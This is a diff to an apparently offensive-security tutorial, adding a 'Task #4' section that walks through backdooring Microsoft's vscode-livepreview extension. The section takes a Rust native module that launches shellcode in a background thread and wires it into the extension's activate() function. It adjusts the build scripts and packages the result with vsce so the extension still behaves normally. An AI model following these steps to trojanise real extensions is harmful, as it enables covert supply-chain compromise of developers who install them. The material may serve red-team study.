@@ -267,6 +267,8 @@ So this gave me the idea for the next task :
 
 ----
 
+## Task #3
+
 We would be using [neon-rs](https://neon-rs.dev/) for now. I highly recommend going through the [hello world](https://neon-rs.dev/docs/hello-world) example as we would be getting pointers from that tutorial. 
 
 Again, create a new extension with:
@@ -516,3 +518,54 @@ This leaves us with one last task:
 > Task #4: Backdoor a legit VSCode extension using this technique
 
 ----
+
+## Task #4
+
+For this task, we will be using the [microsoft's vscode-livepreview extension](http://github.com/microsoft/vscode-livepreview). To be specific, we are using the version at commit [8df3b06b25328caf2cc3f15d62bd4017a7dd3c0b](https://github.com/microsoft/vscode-livepreview/tree/8df3b06b25328caf2cc3f15d62bd4017a7dd3c0b). 
+
+We would be using the same code base from `Task #3`. Copy the `lib.rs` into the `src/` folder. 
+
+> Note: We made a change to the function - I removed the `WaitForSingleObject` part of the program so the shellcode thread does not interfere with the normal workings of the Extension
+
+Next, we copy the `Cargo.toml`, but change the `name` to `live-server`. 
+
+Now we need to update the `scripts` portion of the `package.json` to:
+
+```json
+"cargo-build": "cargo build --message-format=json-render-diagnostics > cargo.log",
+"cross-build": "cross build --message-format=json-render-diagnostics > cross.log",
+"postcargo-build": "neon dist < cargo.log",
+"postcross-build": "neon dist -m /target < cross.log",
+"debug": "npm run cargo-build --",
+"build": "npm run cargo-build -- --release",
+"cross": "npm run cross-build -- --release",
+"compile": "npm run build && node build/tools/codicon_copy.js && tsc -p ./ && move index.node out\\",
+"watch": "node build/tools/codicon_copy.js && tsc -watch -p ./",
+"format": "prettier ./{src,media}/**/*.{ts,css,html,js} --write",
+"test": "node ./out/test/runTest.js"
+```
+
+We have completely removed the `webpack` stuff to save ourselves a lot of trouble. Finally we also add the following `devDependencies`: 
+
+```json
+"@neon-rs/cli": "0.1.82"
+```
+
+Finally, inside `src/extension.ts` file we add the following line:
+
+```js
+export function activate(context: vscode.ExtensionContext): void {
+	require(".").hello();
+  ...
+  ...
+  ...
+}
+```
+
+
+Now we install the required packages and create the extension with:
+
+```bash
+$ npm install
+$ vsce package --no-yarn
+```
